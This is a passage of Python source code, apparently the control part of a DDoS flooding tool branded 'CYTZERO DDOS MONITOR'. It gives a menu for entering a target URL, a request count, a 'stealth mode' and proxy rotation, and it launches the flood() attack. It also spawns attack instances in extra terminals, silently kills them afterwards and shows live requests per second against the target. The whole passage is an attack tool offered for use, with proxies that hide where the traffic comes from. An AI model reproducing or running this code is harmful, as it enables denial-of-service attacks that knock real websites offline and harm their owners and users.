        (f"{Fore.GREEN}[4]{Style.RESET_ALL}", f"{Fore.WHITE}Online Proxy Usage{Style.RESET_ALL} {Fore.YELLOW}({Fore.GREEN if use_proxy else Fore.RED}{'Active' if use_proxy else 'Inactive'}{Style.RESET_ALL}{Fore.YELLOW}){Style.RESET_ALL}"),
        (f"{Fore.GREEN}[7]{Style.RESET_ALL}", f"{Fore.WHITE}Load Proxies from sock5.txt{Style.RESET_ALL}"),
        (f"{Fore.RED}[5]{Style.RESET_ALL}", f"{Fore.RED}Launch Attack (Ctrl+C to stop){Style.RESET_ALL}"),
        (f"{Fore.YELLOW}[6]{Style.RESET_ALL}", f"{Fore.YELLOW}Exit{Style.RESET_ALL}")
    ]
    
    print(f"\n{Fore.CYAN}┌{'─' * 40}┐{Style.RESET_ALL}")
    for num, desc in options:
        print(f"{Fore.CYAN}│{Style.RESET_ALL} {num:<10} {desc:<27} {Fore.CYAN}│{Style.RESET_ALL}")
    print(f"{Fore.CYAN}└{'─' * 40}┘{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.CYAN}Select Option {Fore.GREEN}➜{Style.RESET_ALL} ")
    return choice

# Global variables to store options
url = None
num_requests = DEFAULT_REQUESTS
stealth_mode = False
use_proxy = False
proxies = []
ascii_printed = False

# Main function that processes menu and starts attack
def main():
    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed

    # Cleanup any existing process file at startup
    cleanup_processes()

    if not ascii_printed:
        print(ASCII_ART)
        ascii_printed = True

    try:
        while True:
            choice = show_menu()

            if choice == '1':
                url = input("Enter Target URL: ")
            elif choice == '2':
                try:
                    num_requests = int(input("Enter Number of Requests: "))
                except ValueError:
                    print("Invalid input. Using default request count.")
                    num_requests = DEFAULT_REQUESTS
            elif choice == '3':
                stealth_mode = not stealth_mode
                print("Stealth Mode is now: {}".format("Active" if stealth_mode else "Inactive"))
            elif choice == '4':
                use_proxy = not use_proxy
                print("Online Proxy Usage is now: {}".format("Active" if use_proxy else "Inactive"))
                if use_proxy:
                    print("Fetching proxy list...")
                    proxies = asyncio.run(get_all_proxies())
                    if proxies:
                        print(f"Successfully fetched {len(proxies)} proxies.")
                    else:
                        print("Failed to fetch proxies. Attack will continue without proxies.")
                        use_proxy = False
                else:
                    proxies = []
            elif choice == '7':
                print("Loading proxies from sock5.txt...")
                loaded_proxies = load_proxies_from_file()
                if loaded_proxies:
                    proxies = loaded_proxies
                    use_proxy = True
                    print(f"{Fore.GREEN}Successfully loaded {len(proxies)} proxies from sock5.txt{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Failed to load proxies from sock5.txt{Style.RESET_ALL}")
            elif choice == '5':
                if not url:
                    print("Target URL not set. Please enter a URL first.")
                else:
                    clear_screen()
                    print(ASCII_ART)
                    print("Starting attack...")
                    asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                    print("Attack completed.")
            elif choice == '6':
                print("\n--GOOD BYE FRIEND--")
                cleanup_processes()
                break
            else:
                print("Invalid option. Please try again.")
    except KeyboardInterrupt:
        print("\nTerminating all processes...")
        cleanup_processes()
        print("Goodbye!")
        sys.exit(0)
    except Exception as e:
        print(f"\nError occurred: {str(e)}")
        cleanup_processes()
        sys.exit(1)

def kill_all_terminals():
    try:
        # Silently kill using process file
        if os.path.exists(PROCESS_FILE):
            with open(PROCESS_FILE, 'r') as f:
                data = json.load(f)
            for pid in data.get("child_pids", []):
                try:
                    if os.name == 'nt':  # Windows
                        # Forcefully terminate process tree without any window
                        subprocess.run(['taskkill', '/F', '/T', '/PID', str(pid)], 
                                    stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW)
                    else:  # Linux/Unix
                        os.kill(pid, signal.SIGTERM)
                except:
                    pass

        # Silently kill any remaining processes by title (Windows only)
        if os.name == 'nt':
            # Kill all CMD windows with DDOS in title
            subprocess.run(['taskkill', '/F', '/FI', 'WINDOWTITLE eq DDOS*'], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Kill all python processes running our script
            subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', f'WINDOWTITLE eq *DDOS*'],
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Additional silent cleanup using psutil
            for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                try:
                    if proc.info['window_title'] and "DDOS" in proc.info['window_title']:
                        proc.kill()
                except:
                    continue

        # Silently remove process file
        if os.path.exists(PROCESS_FILE):
            os.remove(PROCESS_FILE)

    except:
        pass  # Suppress all errors for silent operation

# Add new function to update monitor data
def update_monitor_data(terminal_id, stats):
    try:
        with open(MONITOR_FILE, 'a') as f:
            stats['timestamp'] = time.time()
            f.write(json.dumps(stats) + '\n')
    except Exception as e:
        pass  # Silently fail to avoid spamming errors

# Add new function to run the monitor terminal
async def run_monitor_terminal():
    clear_screen()
    
    start_time = time.time()
    target_url = "Unknown"
    
    # Try to get target URL
    try:
        if os.path.exists(MONITOR_TARGET_FILE):
            with open(MONITOR_TARGET_FILE, 'r') as f:
                target_url = f.read().strip()
    except:
        pass
    
    while True:
        try:
            clear_screen()
            print(ASCII_ART)
            
            current_time = time.time()
            total_requests = 0
            recent_requests = 0
            
            # Read and process recent data
            if os.path.exists(MONITOR_FILE):
                with open(MONITOR_FILE, 'r') as f:
                    lines = f.readlines()
                    # Only process last 100 lines for efficiency
                    for line in lines[-100:]:
                        try:
                            data = json.loads(line.strip())
                            if current_time - data.get('timestamp', 0) <= 1:  # Only count last second
                                recent_requests += data.get('success', 0) + data.get('failure', 0)
                            total_requests += data.get('success', 0) + data.get('failure', 0)
                        except:
                            continue
            
            # Calculate current RPS
            current_rps = recent_requests
            
            # Create fancy display
            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════╗{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL}           {Fore.RED}CYTZERO DDOS MONITOR{Style.RESET_ALL}           {Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            
            # Display target URL with proper padding
            target_display = target_url[:40]  # Take first 40 chars
            padding = " " * (40 - len(target_display))  # Calculate padding needed
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}TARGET:{Style.RESET_ALL} {Fore.RED}{target_display}{padding}{Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}")
            
            # If URL is longer than 40 chars, show the rest on next line(s)
            if len(target_url) > 40:
                remaining = target_url[40:]
                while remaining:
                    chunk = remaining[:40]
                    padding = " " * (40 - len(chunk))
                    print(f"{Fore.CYAN}║{Style.RESET_ALL}        {Fore.RED}{chunk}{padding}{Style.RESET_ALL}{Fore.CYAN}║{Style.RESET_ALL}")
                    remaining = remaining[40:]
            
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Current RPS:{Style.RESET_ALL} {Fore.GREEN}{current_rps:,}{Style.RESET_ALL}{' ' * (37 - len(str(current_rps)))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Total Requests:{Style.RESET_ALL} {Fore.GREEN}{total_requests:,}{Style.RESET_ALL}{' ' * (34 - len(str(total_requests)))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Runtime:{Style.RESET_ALL} {Fore.GREEN}{int(current_time - start_time)}s{Style.RESET_ALL}{' ' * (39 - len(str(int(current_time - start_time))))}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════╣{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL}              {Fore.RED}CREDITS{Style.RESET_ALL}                     {Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Developer: {Fore.GREEN}FRMDAO{Style.RESET_ALL}{' ' * 31}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Team: {Fore.GREEN}CYTZERO{Style.RESET_ALL}{' ' * 33}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}║{Style.RESET_ALL} Version: {Fore.GREEN}9.9.9{Style.RESET_ALL}{' ' * 32}{Fore.CYAN}║{Style.RESET_ALL}")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════╝{Style.RESET_ALL}")
            
            # Clear old data periodically (keep last 1000 lines)
            if os.path.exists(MONITOR_FILE):
                with open(MONITOR_FILE, 'r') as f:
                    lines = f.readlines()
                if len(lines) > 1000:
                    with open(MONITOR_FILE, 'w') as f:
                        f.writelines(lines[-1000:])
            
            await asyncio.sleep(MONITOR_UPDATE_INTERVAL)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            await asyncio.sleep(MONITOR_UPDATE_INTERVAL)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == '--monitor':
            # Run monitor terminal
            asyncio.run(run_monitor_terminal())
            sys.exit(0)
        elif sys.argv[1] == '--spawn-instance':
            try:
                url = sys.argv[2]
                num_requests = int(sys.argv[3])
                stealth_mode = bool(int(sys.argv[4]))
                use_proxy = bool(int(sys.argv[5])) if len(sys.argv) > 5 else False
                print(f"{Fore.CYAN}Starting attack in spawned terminal...{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Target:{Style.RESET_ALL} {url}")
                print(f"{Fore.YELLOW}Requests:{Style.RESET_ALL} {num_requests}")
                print(f"{Fore.YELLOW}Stealth Mode:{Style.RESET_ALL} {'Active' if stealth_mode else 'Inactive'}")
                print(f"{Fore.YELLOW}Proxy Mode:{Style.RESET_ALL} {'Active' if use_proxy else 'Inactive'}\n")
                
                # Get proxies from main terminal if proxy mode is enabled
                if use_proxy:
                    print(f"{Fore.CYAN}Loading proxies from main terminal...{Style.RESET_ALL}")
                    try:
                        if os.path.exists(PROXY_SHARE_FILE):
                            with open(PROXY_SHARE_FILE, 'r') as f:
                                proxies = json.load(f)
                            if proxies:
                                print(f"{Fore.GREEN}Successfully loaded {len(proxies)} proxies from main terminal{Style.RESET_ALL}")
                            else:
                                print(f"{Fore.RED}No proxies available from main terminal{Style.RESET_ALL}")
                                use_proxy = False
                        else:
                            print(f"{Fore.RED}No proxy share file found{Style.RESET_ALL}")
                            use_proxy = False
                    except Exception as e:
                        print(f"{Fore.RED}Error loading proxies: {str(e)}{Style.RESET_ALL}")
                        use_proxy = False
                
                # Run the flood with proxy settings
                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
            except KeyboardInterrupt:
                sys.exit(0)
            except Exception as e:
                print(f"Error in child process: {str(e)}")
                sys.exit(1)
        else:
            main()
    else:
        main()
